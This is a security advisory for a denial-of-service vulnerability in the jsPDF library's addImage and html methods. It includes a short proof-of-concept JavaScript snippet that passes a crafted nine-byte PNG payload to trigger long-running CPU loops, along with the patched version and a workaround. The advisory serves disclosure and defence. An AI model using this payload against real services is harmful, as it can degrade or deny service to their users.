summary: "jsPDF Denial of Service (DoS)\n### Impact\nUser control of the first argument of the\
  \ addImage method results in CPU utilization and denial of service.\n\nIf given the possibility\
  \ to pass unsanitized image data or URLs to the addImage method, a user can provide a harmful\
  \ PNG file that results in high CPU utilization and denial of service.\n\nOther affected methods\
  \ are: `html`.\n\nExample payload:\n\n```js\nimport { jsPDF } from \"jspdf\" \n\nconst payload\
  \ = new Uint8Array([117, 171, 90, 253, 166, 154, 105, 166, 154])\n\nconst doc = new jsPDF();\n\
  const startTime = performance.now();\ntry {\n  doc.addImage(payload, \"PNG\", 10, 40, 180,\
  \ 180, undefined, \"SLOW\");\n} finally {\n  const endTime = performance.now();\n  console.log(`Call\
  \ to doc.addImage took ${endTime - startTime} milliseconds`);\n}\n```\n\n### Patches\nThe\
  \ vulnerability was fixed in jsPDF 3.0.2. Upgrade to jspdf@>=3.0.2.\n\nIn jspdf@>=3.0.2, invalid\
  \ PNG files throw an Error instead of causing very long running loops.\n\n### Workarounds\n\
  Sanitize image data or URLs before passing it to the addImage method or one of the other affected\
  \ methods.\n\n### Credits\nResearcher: Aleksey Solovev (Positive Technologies)"
